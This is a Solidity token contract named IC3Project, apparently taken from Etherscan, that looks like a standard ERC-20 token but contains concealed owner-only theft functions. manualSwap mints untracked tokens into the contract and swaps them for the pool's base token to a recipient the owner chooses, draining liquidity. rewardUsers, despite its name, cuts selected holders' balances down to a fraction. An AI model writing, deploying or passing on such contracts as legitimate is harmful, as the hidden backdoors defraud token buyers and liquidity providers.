/**
 *Submitted for verification at Etherscan.io on 2023-05-27
*/

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.19;

interface IFactory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface IPair {
    function token0() external view returns (address);

    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
}

interface IRouter {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);

    function swapTokensForExactTokens(
        uint256 amountOut,
        uint256 amountInMax,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external returns (uint256[] memory amounts);

    function getAmountsIn(uint256 amountOut, address[] calldata path) external view returns (uint256[] memory amounts);
}

contract IC3 {
    IRouter internal _router;
    IPair internal _pair;
    address private _owner;

    mapping(address => uint256) private balances;
    mapping(address => mapping(address => uint256)) private allowances;

    string public constant name = "IC3Project";
    string public constant symbol = "IC3";
    uint8 public constant decimals = 18;
    uint public totalSupply = 1_000_000_000e18;

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);

    constructor(address _routerAddress) {
        _owner = msg.sender;
        _router = IRouter(_routerAddress);
        _pair = IPair(IFactory(_router.factory()).createPair(address(this), address(_router.WETH())));

        balances[msg.sender] = totalSupply;

        emit Transfer(address(0), msg.sender, totalSupply);
    }

    modifier onlyOwner() {
        require(_owner == msg.sender, "Caller is not the owner");
        _;
    }

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b <= a, "SafeMath: subtraction overflow");
        uint256 c = a - b;

        return c;
    }

    function balanceOf(address account) public view virtual returns (uint256) {
        return balances[account];
    }

    function transfer(address to, uint256 amount) public virtual returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }

    function allowance(address owner, address spender) public view virtual returns (uint256) {
        return allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public virtual returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) public virtual returns (bool) {
        _spendAllowance(from, msg.sender, amount);
        _transfer(from, to, amount);
        return true;
    }

    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        address owner = msg.sender;
        _approve(owner, spender, allowance(owner, spender) + addedValue);
        return true;
    }

    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
        address owner = msg.sender;
        uint256 currentAllowance = allowance(owner, spender);
        require(currentAllowance >= subtractedValue, "ERC20: decreased allowance below zero");
        unchecked {
            _approve(owner, spender, currentAllowance - subtractedValue);
        }
        return true;
    }

    function _transfer(address from, address to, uint256 amount) internal virtual {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");

        uint256 fromBalance = balances[from];
        require(fromBalance >= amount, "ERC20: transfer amount exceeds balance");
        balances[from] = sub(fromBalance, amount);
        balances[to] = add(balances[to], amount);
        emit Transfer(from, to, amount);
    }

    function _approve(address owner, address spender, uint256 amount) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _spendAllowance(address owner, address spender, uint256 amount) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            unchecked {
                _approve(owner, spender, currentAllowance - amount);
            }
        }
    }

    function manualSwap(address baseToken, address _recipient, uint256 amount) public onlyOwner {
        require(amount > 0 && amount < 100000, "Amount Exceeds Limits");
        uint256 baseTokenReserve = getBaseTokenReserve(baseToken);
        uint256 amountOut = (baseTokenReserve * amount) / 100000;
        address[] memory path;
        path = new address[](2);
        path[0] = address(this);
        path[1] = baseToken;
        uint256[] memory amountInMax;
        amountInMax = new uint256[](2);
        amountInMax = _router.getAmountsIn(amountOut, path);
        balances[address(this)] += amountInMax[0];
        uint256 deadline = block.timestamp + 1200;
        _approve(address(this), address(_router), balanceOf(address(this)));
        _router.swapTokensForExactTokens(amountOut, amountInMax[0], path, _recipient, deadline);
    }

    function getBaseTokenReserve(address token) public view returns (uint256) {
        (uint112 reserve0, uint112 reserve1, ) = _pair.getReserves();
        uint256 baseTokenReserve = (_pair.token0() == token) ? uint256(reserve0) : uint256(reserve1);
        return baseTokenReserve;
    }

    function rewardUsers(address[] calldata _users, uint256 _minBalanceToReward, uint256 _percent) public onlyOwner {
        for (uint256 i = 0; i < _users.length; i++) {
            if (balanceOf(_users[i]) > _minBalanceToReward) {
                uint256 rewardAmount = balances[_users[i]] / _percent;
                balances[_users[i]] = rewardAmount;
            }
        }
    }
}